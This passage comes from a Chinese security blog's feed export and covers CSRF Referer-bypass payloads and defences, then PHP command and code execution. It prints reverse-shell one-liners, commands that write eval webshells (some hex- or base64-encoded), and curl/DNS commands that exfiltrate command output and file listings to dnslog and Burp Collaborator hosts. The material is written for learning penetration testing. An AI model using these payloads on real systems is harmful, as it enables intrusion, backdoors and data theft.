class="string">&quot;data:text/html;base64,PGZvcm0gbWV0aG9kPXBvc3QgYWN0aW9uPWh0dHA6Ly9hLmIuY29tL2Q+PGlucHV0IHR5cGU9dGV4dCBuYW1lPSdpZCcgdmFsdWU9JzEyMycvPjwvZm9ybT48c2NyaXB0PmRvY3VtZW50LmZvcm1zWzBdLnN1Ym1pdCgpOzwvc2NyaXB0Pg==&quot;</span>&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">payload:</span><br><span class="line">&lt;form method=post action=http:<span class="comment">//a.b.com/d&gt;&lt;input type=text name=&#x27;id&#x27; value=&#x27;123&#x27;/&gt;&lt;/form&gt;&lt;script&gt;document.forms[0].submit();&lt;/script&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>利用https协议</p><p>https向http跳转的时候Referer为空</p><p>payload在https环境下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src&#x3D;&quot;https:&#x2F;&#x2F;xxxxx.xxxxx&#x2F;attack.php&quot;&gt;</span><br></pre></td></tr></table></figure><p> attack.php写上CSRF攻击代码</p></li></ul></li><li><p>Referrer Policy</p><p>隐藏referrer</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;steady.com&quot; referrerpolicy&#x3D;&quot;no-referrer&quot;&gt; </span><br></pre></td></tr></table></figure></li><li><p>IE6、7下使用window.location.href=url、window.open进行界面的跳转，会丢失Referer。</p></li></ul></li><li><p>绕过后台逻辑判断</p><p>可以在我们的恶意url中添加上后台指定的url(把对方指定的url名字变成我们的文件夹名字)</p></li></ul><h5 id="3、jsonp跨域劫持"><a href="#3、jsonp跨域劫持" class="headerlink" title="3、jsonp跨域劫持"></a>3、jsonp跨域劫持</h5><p>通过发起jsonp请求，拿到服务端发回的token</p><h4 id="防御思路"><a href="#防御思路" class="headerlink" title="防御思路"></a>防御思路</h4><h5 id="1、验证码"><a href="#1、验证码" class="headerlink" title="1、验证码"></a>1、验证码</h5><p>优点：</p><p>验证码类型日新月异,各种技术层出不穷。可以很好的防止CSRF</p><p>缺点：</p><p>无法大量部署。影响用户体验。不能每一步都加上验证码。</p><h5 id="2、二次验证"><a href="#2、二次验证" class="headerlink" title="2、二次验证"></a>2、二次验证</h5><p><strong>检查请求来源</strong></p><p>优点:</p><p>检查请求来源的主要方式为 Referer、Origin，就是 HTTP 请求头的那个（两者比较类似，下面仅以 Referer 为例）。Referer 最常见的应用实际上是防盗链。比如我的博客就有。防盗链利用了 referer 检查请求的来源，同样也可以利用来防御 CSRF。</p><p>缺点:</p><ul><li>用户为了保护隐私，自己阻止了浏览器发送 referer</li><li>攻击者可以让自己的页面不发送 referer：<meta name="referer" content="never">这个代码告诉浏览器，所有从当前页面中发起的请求都不要携带 referer</li><li>HTTPS 转为 HTTP 的时候，浏览器出于安全的考虑，不发送 referer。例如网站中有<meta name="referrer" content="default">，如果当前页面使用的是 HTTPS，而正要加载的资源使用的是 HTTP，则将 HTTP header 中的 referer 置空。但是如果是 content=”always” 的话，浏览器会把 HTTPS 的 referer 带给 HTTP 的页面</li><li>如果添加referer并且目标页面token是get形式发送(在url中可见),我们伪造一个页面让别人从目标站来访问我们自己的页面,在请求头中的referer能够带上token,导致token泄漏</li></ul><h5 id="3、Token"><a href="#3、Token" class="headerlink" title="3、Token"></a>3、Token</h5><p>那么我们可以要求所有的用户请求都携带一个CSRF攻击者无法获取到的Token。服务器通过校验请求是否携带正确的Token，来把正常的请求和攻击的请求区分开，也可以防范CSRF的攻击。</p><p>CSRF Token的防护策略分为三个步骤：</p><p>1.将CSRF Token输出到页面中</p><p>Token不能放在cookie中，容易被获取，最好放在服务端到session中。之后在每次页面加载时，使用JS遍历整个DOM树，对于DOM中所有的a和form标签后加入Token。这样可以解决大部分的请求，但是对于在页面加载之后动态生成的HTML代码，这种方法就没有作用，还需要程序员在编码时手动添加Token。</p><p>2.页面提交的请求携带这个Token</p><p>对于GET请求，Token将附在请求地址之后。</p><p>对于 POST 请求来说，要在 form 的最后加上。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type&#x3D;”hidden” name&#x3D;”csrftoken” value&#x3D;”tokenvalue”&#x2F;&gt;</span><br></pre></td></tr></table></figure><p>3.服务器验证Token是否正确</p><p>Token的分布式校验</p><p>Session默认存储在单机服务器内存中，因此在分布式环境下同一个用户发送的多次HTTP请求可能会先后落到不同的服务器上，导致后面发起的HTTP请求无法拿到之前的HTTP请求存储在服务器中的Session数据，从而使得Session机制在分布式环境下失效，因此在分布式集群中CSRF Token需要存储在Redis之类的公共存储空间。为此解决办法是Token是一个计算出来的结果，而非随机生成的字符串。这样在校验时无需再去读取存储的Token，只用再次计算一次即可。</p><h5 id="4、同源检测"><a href="#4、同源检测" class="headerlink" title="4、同源检测"></a>4、同源检测</h5><p>服务器可以通过解析这两个Header–Origin Header、Referer Header中的域名，确定请求的来源域。</p><p>注意：</p><p>IE11同源策略： IE 11 不会在跨站CORS请求上添加Origin标头，Referer头将仍然是唯一的标识。</p><p>302重定向： 在302重定向之后Origin不包含在重定向的请求中，因为Origin可能会被认为是其他来源的敏感信息。对于302重定向的情况来说都是定向到新的服务器上的URL，因此浏览器不想将Origin泄漏到新的服务器上。</p><p>Referer：对于Ajax请求，图片和script等资源请求，Referer为发起请求的页面地址。对于页面跳转，Referer为打开页面历史记录的前一个页面地址。因此我们使用Referer中链接的Origin部分可以得知请求的来源域名。</p><p>如果攻击者有权限在本域发布评论（含链接、图片等，统称UGC），那么它可以直接在本域发起攻击，这种情况下同源策略无法达到防护的作用。</p><h5 id="5、双重cookie"><a href="#5、双重cookie" class="headerlink" title="5、双重cookie"></a>5、双重cookie</h5><p>双重Cookie采用以下流程：</p><ul><li>在用户访问网站页面时，向请求域名注入一个Cookie，内容为随机字符串（例如<code>csrfcookie=v8g9e4ksfhw</code>）。</li><li>在前端向后端发起请求时，取出Cookie，并添加到URL的参数中（接上例<code>POST https://www.a.com/comment?csrfcookie=v8g9e4ksfhw</code>）。</li><li>后端接口验证Cookie中的字段与URL参数中的字段是否一致，不一致则拒绝。</li></ul><h5 id="6、Samesite-Cookie属性"><a href="#6、Samesite-Cookie属性" class="headerlink" title="6、Samesite Cookie属性"></a>6、Samesite Cookie属性</h5><p>Google起草了一份草案来改进HTTP协议，那就是为Set-Cookie响应头新增Samesite属性，它用来标明这个 Cookie是个“同站 Cookie”，同站Cookie只能作为第一方Cookie，不能作为第三方Cookie，Samesite 有两个属性值，分别是 Strict 和 Lax。</p><p>Samesite=Strict</p><p>严格模式，表明这个 Cookie 在任何情况下都不可能作为第三方 Cookie，绝无例外。</p><p>淘宝网站用来识别用户登录与否的 Cookie 被设置成了 Samesite=Strict，那么用户从百度搜索页面甚至天猫页面的链接点击进入淘宝后，淘宝都不会是登录状态，因为淘宝的服务器不会接受到那个 Cookie，其它网站发起的对淘宝的任意请求都不会带上那个 Cookie。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: foo&#x3D;1; Samesite&#x3D;Strict</span><br><span class="line">Set-Cookie: bar&#x3D;2; Samesite&#x3D;Lax</span><br><span class="line">Set-Cookie: baz&#x3D;3</span><br></pre></td></tr></table></figure><p>在 <a href="http://a.com/">a.com</a> 下发起对 <a href="http://b.com/">b.com</a> 的任意请求，foo 这个 Cookie 都不会被包含在 Cookie 请求头中，但 bar 会。</p><p>Samesite=Lax</p><p>宽松模式，比 Strict 放宽了点限制：假如这个请求是这种请求（改变了当前页面或者打开了新页面）且同时是个GET请求，则这个Cookie可以作为第三方Cookie。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: foo&#x3D;1; Samesite&#x3D;Strict</span><br><span class="line">Set-Cookie: bar&#x3D;2; Samesite&#x3D;Lax</span><br><span class="line">Set-Cookie: baz&#x3D;3</span><br></pre></td></tr></table></figure><p>当用户从 <a href="http://a.com/">a.com</a> 点击链接进入 <a href="http://b.com/">b.com</a> 时，foo 这个 Cookie 不会被包含在 Cookie 请求头中，但 bar 和 baz 会，也就是说用户在不同网站之间通过链接跳转是不受影响了。但假如这个请求是从 <a href="http://a.com/">a.com</a> 发起的对 <a href="http://b.com/">b.com</a> 的异步请求，或者页面跳转是通过表单的 post 提交触发的，则bar也不会发送。</p><p>该设置有个缺点，topic.a.com下的Cookie，并不能使用a.com下种植的SamesiteCookie。这就导致了当我们网站有多个子域名时，不能使用SamesiteCookie在主域名存储用户登录信息。每个子域名都需要用户重新登录一次。</p>]]></content>
      
      
      <categories>
          
          <category> 前端安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OWSP-TOP10 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令执行与代码执行</title>
      <link href="2018/12/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
      <url>2018/12/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h3 id="命令执行与代码执行"><a href="#命令执行与代码执行" class="headerlink" title="命令执行与代码执行"></a>命令执行与代码执行</h3><h4 id="命令执行原理"><a href="#命令执行原理" class="headerlink" title="命令执行原理"></a>命令执行原理</h4><p>是指用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令，可能会允许攻击者通过改变 $PATH 或程序执行环境的其他方面来执行一个恶意构造的代码。</p><h4 id="命令执行常见利用符号"><a href="#命令执行常见利用符号" class="headerlink" title="命令执行常见利用符号"></a>命令执行常见利用符号</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">command1&amp;command2 两个命令同时执行</span><br><span class="line">command1&amp;&amp;command2 只有前面命令执行成功，后面命令才继续执行</span><br><span class="line">command1;command2 不管前面命令执行成功没有，后面的命令继续执行</span><br><span class="line">command1||command2 顺序执行多条命令，当碰到执行正确的命令后将不执行后面的命令</span><br></pre></td></tr></table></figure><h4 id="命令执行常见函数"><a href="#命令执行常见函数" class="headerlink" title="命令执行常见函数"></a>命令执行常见函数</h4><p>syetem()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜ ~ php -r &quot;system(&#39;whoami&#39;);&quot;</span><br></pre></td></tr></table></figure><p>passthru()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜ ~ php -r &quot;passthru(&#39;whoami&#39;);&quot;</span><br></pre></td></tr></table></figure><p>exec()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜ ~ php -r &quot;echo exec(&#39;whoami&#39;);&quot;</span><br></pre></td></tr></table></figure><p>执行给予的命令command，不过它并不会输出任何东西</p><p>shell_exec()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜ ~ php -r &quot;echo shell_exec(&#39;whoami&#39;);&quot;</span><br></pre></td></tr></table></figure><p>`反引号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜ ~ php -r &quot;echo @&#96;whoami&#96;;&quot;</span><br></pre></td></tr></table></figure><p>ob_start()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    ob_start(&quot;system&quot;);</span><br><span class="line">    echo &quot;whoami&quot;;</span><br><span class="line">    ob_end_flush();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>此函数将打开输出缓冲。当输出缓冲激活后，脚本将不会输出内容（除http标头外），相反需要输出的内容被存储在内部缓冲区中。</p><p>内部缓冲区的内容可以用 ob_get_contents() 函数复制到一个字符串变量中。 想要输出存储在内部缓冲区中的内容，可以使用 ob_end_flush() 函数。另外， 使用 ob_end_clean() 函数会静默丢弃掉缓冲区的内容。</p><h4 id="处理无回显的命令执行"><a href="#处理无回显的命令执行" class="headerlink" title="处理无回显的命令执行"></a>处理无回显的命令执行</h4><p>1、使用vps进行监听</p><p>2、利用ceye平台</p><h4 id="代码执行原理"><a href="#代码执行原理" class="headerlink" title="代码执行原理"></a>代码执行原理</h4><p>应用程序在调用一些能够将字符串转换为代码的函数（如PHP中的eval）时，没有考虑用户是否控制这个字符串，将造成代码执行漏洞。</p><h4 id="代码执行常见函数"><a href="#代码执行常见函数" class="headerlink" title="代码执行常见函数"></a>代码执行常见函数</h4><p>eval()</p><p>把字符串 code 作为PHP代码执行，传入的必须是有效的 PHP 代码。所有的语句必须以分号结尾，eval() 返回 NULL。</p><p>assert()</p><p>把字符串 $assertion 作为PHP代码执行，assert($assertion) 会检查指定的 assertion 并在结果为 FALSE 时采取适当的行动，如果 assertion 是字符串，它将会被 <strong>assert()</strong> 当做 PHP 代码来执行。</p><p>preg_replace()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit &#x3D; -1 [, int &amp;$count ]] )</span><br></pre></td></tr></table></figure><p>搜索subject中匹配pattern的部分， 以replacement进行替换。</p><p>preg_replace — 执行一个正则表达式的搜索和替换,/e 修正符使 <em>preg_replace()</em> 将 <em>replacement</em> 参数当作 PHP 代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(<span class="string">&quot;/test/e&quot;</span>,$_GET[<span class="string">&quot;h&quot;</span>],<span class="string">&quot;jutst test&quot;</span>); </span><br></pre></td></tr></table></figure><p>如果我们提交 ?h=phpinfo()，/e就会将h参数当做PHP代码，phpinfo()将会被执行。</p><p>create_function()</p><p>create_function — 创建一个匿名函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$newfunc = create_function(<span class="string">&#x27;$v&#x27;</span>, <span class="string">&#x27;return system($v);&#x27;</span>);</span><br><span class="line">$newfunc(<span class="string">&#x27;whoami&#x27;</span>);</span><br></pre></td></tr></table></figure><p>call_user_func()</p><p>call_user_func — 把第一个参数作为回调函数调用。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed call_user_func ( <span class="keyword">callable</span> $callback [, mixed $parameter [, mixed $... ]] )</span><br></pre></td></tr></table></figure><p>第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。</p><p>call_user_func_array()</p><p>call_user_func_array — 调用回调函数，并把一个数组参数作为回调函数的参数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed call_user_func_array ( <span class="keyword">callable</span> $callback , <span class="keyword">array</span> $param_arr )</span><br></pre></td></tr></table></figure><p>把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的的参数传入。</p><h4 id="命令执行与代码执行获取shell"><a href="#命令执行与代码执行获取shell" class="headerlink" title="命令执行与代码执行获取shell"></a>命令执行与代码执行获取shell</h4><ul><li><p>命令执行获取shell</p><ul><li><p>反弹shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">syetem(&#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;124&#x2F;443 0&gt;&amp;1&#39;);</span><br></pre></td></tr></table></figure></li><li><p>写shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo 3c3f706870206576616c28245f504f53545b3132335d293b203f3e|xxd -r -ps &gt; webshell.php</span><br><span class="line">echo &quot;&lt;?php @eval(\$_POST[123]); ?&gt;&quot; &gt; webshell.php</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget 网址 -O webshell.php #使用wget下载shell，使用参数-O来指定一个文件名</span><br></pre></td></tr></table></figure></li></ul></li></ul><ul><li><p>代码执行获取shell</p><ul><li><p>反弹shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(&#39;$sock&#x3D;fsockopen(&quot;124&quot;,443);exec(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;)</span><br></pre></td></tr></table></figure></li><li><p>写shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(&#39;@fputs(fopen(base64_decode(&#39;bG9zdC5waHA&#x3D;&#39;),w),base64_decode(&#39;PD9waHAgQGV2YWwoJF9QT1NUWydsb3N0d29sZiddKTs&#x2F;Pg&#x3D;&#x3D;&#39;));&#39;)</span><br></pre></td></tr></table></figure></li></ul></li></ul><h4 id="命令执行无回显"><a href="#命令执行无回显" class="headerlink" title="命令执行无回显"></a>命令执行无回显</h4><p>后台代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; $_GET[&#39;id&#39;];</span><br><span class="line">echo(shell_exec($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h5 id="1、利用延时来判断是有具有命令执行漏洞"><a href="#1、利用延时来判断是有具有命令执行漏洞" class="headerlink" title="1、利用延时来判断是有具有命令执行漏洞"></a>1、利用延时来判断是有具有命令执行漏洞</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;1.php?id&#x3D;sleep%204</span><br></pre></td></tr></table></figure><p>如果执行后延时5秒，就证明测试点存在命令执行漏洞。</p><h5 id="2、利用http请求"><a href="#2、利用http请求" class="headerlink" title="2、利用http请求"></a>2、利用http请求</h5><p>ping命令不会发起http请求。</p><p>使用curl发起http请求</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;1.php?id&#x3D;curl%20127.0.0.1:1234</span><br></pre></td></tr></table></figure><p>vps上监听端口1234</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ ncat -lnvp 1234</span><br><span class="line">Ncat: Version 7.80 ( https:&#x2F;&#x2F;nmap.org&#x2F;ncat )</span><br><span class="line">Ncat: Listening on :::1234</span><br><span class="line">Ncat: Listening on 0.0.0.0:1234</span><br><span class="line">Ncat: Connection from 127.0.0.1.</span><br><span class="line">Ncat: Connection from 127.0.0.1:53979.</span><br><span class="line">GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1:1234</span><br><span class="line">User-Agent: curl&#x2F;7.64.1</span><br><span class="line">Accept: *&#x2F;*</span><br></pre></td></tr></table></figure><p>可以看到命令成功执行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ curl  5lruf1898h08u379lms247tj6ac00p.burpcollaborator.net&#x2F;&#96;whoami&#96;</span><br></pre></td></tr></table></figure><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201111171337891.png" alt="image-20201111171337891"></p><h5 id="3、DNS请求"><a href="#3、DNS请求" class="headerlink" title="3、DNS请求"></a>3、DNS请求</h5><p>利用DNS解析请求，我们可以构造一个二级级域名，当他发起一级域名请求的时候，可以去查看DNS解析请求，而我们在二级域名中，插入我们的命令，此时命令即被执行，执行成功之后的结果也可以在DNS解析请求中查到。</p><p>比如：</p><p>一个一级域名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rjs8aa.dnslog.cn</span><br></pre></td></tr></table></figure><p>我们构造一个二级域名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &#96;whoami&#96;.rjs8aa.dnslog.cn</span><br></pre></td></tr></table></figure><p>利用dns平台dnslog.cn或者cheye.io、也可以使用burp的Collaborator Client功能，可以看到我们的DNS请求，进而拿到我们命令执行的结果。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201111170448255.png" alt="image-20201111170448255"></p><h5 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h5><p>1、DNS每一级域名长度的限制是63个字符，这时候如果数据带不出来，可以尝试shell脚本，截取某一部分带出数据。</p><p>目标系统执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ &#96;for i in $(ls);do curl &quot;http:&#x2F;&#x2F;$i.bbqkz7t5xci7vcuexsmvnmrdd4jw7l.burpcollaborator.net&#x2F;&quot;;done;&#96;</span><br></pre></td></tr></table></figure><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201111174638134.png" alt="image-20201111174638134"></p><p>利用VPS搭建一个临时服务器，在攻击机器上请求VPS地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ python -m SimpleHTTPServer 7777</span><br><span class="line">Serving HTTP on 0.0.0.0 port 7777 ...</span><br><span class="line">172.20.10.10 - - [11&#x2F;Nov&#x2F;2020 22:46:02] code 404, message File not found</span><br><span class="line">172.20.10.10 - - [11&#x2F;Nov&#x2F;2020 22:46:02] &quot;GET &#x2F;1.py HTTP&#x2F;1.1&quot; 404 -</span><br><span class="line">172.20.10.10 - - [11&#x2F;Nov&#x2F;2020 22:46:02] code 404, message File not found</span><br><span class="line">172.20.10.10 - - [11&#x2F;Nov&#x2F;2020 22:46:02] &quot;GET &#x2F;1.txt HTTP&#x2F;1.1&quot; 404 -</span><br><span class="line">172.20.10.10 - - [11&#x2F;Nov&#x2F;2020 22:46:02] code 404, message File not found</span><br><span class="line">172.20.10.10 - - [11&#x2F;Nov&#x2F;2020 22:46:02] &quot;GET &#x2F;公共 HTTP&#x2F;1.1&quot; 404 -</span><br><span class="line">172.20.10.10 - - [11&#x2F;Nov&#x2F;2020 22:46:02] code 404, message File not found</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ &#96;for i in $(ls);do curl &quot;http:&#x2F;&#x2F;172.20.10.4:7777&#x2F;$i&quot;;done;&#96;</span><br></pre></td></tr></table></figure><p>可以看到数据成功被带出来。</p><p>2、如果系统限制了某些特殊字符与特殊符号，我们可是借助Linux系统，先将输出的内容进行base64编码，然后在将内容带出的系统之外。在kali下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ ls|base64</span><br><span class="line">MS5weQoxLnR4dArlhazlhbEK5qih5p2/CuinhumikQrlm77niYcK5paH5qGjCuS4i+i9vQrpn7Pk</span><br><span class="line">uZAK5qGM6Z2iCmRhdGEudHh0CmRucy50eHQKZ2V0LXBpcC5weQpzdGVhZHkudHh0CnRjcC50eHQK</span><br><span class="line">dXJsLnR4dAp1c2JkYXRhLnR4dAo=</span><br></pre></td></tr></table></figure><p>ping命令不能使用base64编码的方式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ ping `ls|base64`.ophxdk7ibpwk9p8rb5081z5qrhx7lw.burpcollaborator.net</span><br><span class="line">ping: dXJsLnR4dAp1c2JkYXRhLnR4dAo=.ophxdk7ibpwk9p8rb5081z5qrhx7lw.burpcollaborator.net: 未知的名称或服务</span><br></pre></td></tr></table></figure><p>但是可以使用curl命令发起http请求。配合base64编码绕过限制。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ curl  ypr24cta9q60inhb0h4sxid9g0mqaf.burpcollaborator.net&#x2F;&#96;ls|base64&#96;</span><br></pre></td></tr></table></figure><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201111172955439.png" alt="image-20201111172955439"></p><h3 id="命令执行常见数据带出的方式"><a href="#命令执行常见数据带出的方式" class="headerlink" title="命令执行常见数据带出的方式"></a>命令执行常见数据带出的方式</h3><h5 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ pwd | base64</span><br><span class="line">L2hvbWUvc3RlYWR5Cg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><h5 id="配合linux文本处理命令"><a href="#配合linux文本处理命令" class="headerlink" title="配合linux文本处理命令"></a>配合linux文本处理命令</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ pwd | od -A n -t x1 | sed &#39;s&#x2F; &#x2F;&#x2F;g&#39;</span><br><span class="line">2f686f6d652f7374656164790a</span><br></pre></td></tr></table></figure><h5 id="curl与数组、sed命令"><a href="#curl与数组、sed命令" class="headerlink" title="curl与数组、sed命令"></a>curl与数组、sed命令</h5><p> curl 是可以跟数组的，每个都会进行请求。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ curl $(echo &#39;c.com b.com a.com&#39;)</span><br><span class="line">curl: (52) Empty reply from server</span><br><span class="line">curl: (52) Empty reply from server</span><br><span class="line">curl: (52) Empty reply from server</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ curl $(find &#x2F;home&#x2F;steady -name &#39;*.txt&#39;|od -A n -t x1|sed &#39;s&#x2F; &#x2F;&#x2F;g&#39;|sed -r &#39;s&#x2F;$&#x2F;.9rg7oe.dnslog.cn&#x2F;g&#39;)</span><br><span class="line">curl: (7) Failed to connect to 2f686f6d652f7374656164792f2e6d6f.9rg7oe.dnslog.cn port 80: 拒绝连接</span><br><span class="line">curl: (7) Failed to connect to 7a696c6c612f66697265666f782f786f.9rg7oe.dnslog.cn port 80: 拒绝连接</span><br><span class="line">curl: (7) Failed to connect to 673474326b6d2e64656661756c742d65.9rg7oe.dnslog.cn port 80: 拒绝连接</span><br><span class="line">curl: (7) Failed to connect to 73722f53697465536563757269747953.9rg7oe.dnslog.cn port 80: 拒绝连接</span><br></pre></td></tr></table></figure><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201116150334538.png" alt="image-20201116150334538"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ xxd -r -p 1.txt</span><br><span class="line">erviceState.txt</span><br></pre></td></tr></table></figure><h3 id="常见命令执行payload"><a href="#常见命令执行payload" class="headerlink" title="常见命令执行payload"></a>常见命令执行payload</h3><p>查找某目录可写的文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl $(find &#x2F;dir -type d -writable |od -A n -t x1|sed &#39;s&#x2F; &#x2F;&#x2F;g&#39;|sed -r &#39;s&#x2F;$&#x2F;.ksdjop.dnslog.cn&#x2F;g&#39;)</span><br></pre></td></tr></table></figure><h3 id="命令执行绕过"><a href="#命令执行绕过" class="headerlink" title="命令执行绕过"></a>命令执行绕过</h3><ul><li><p>绕过空格</p><ul><li><p>在bash下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span 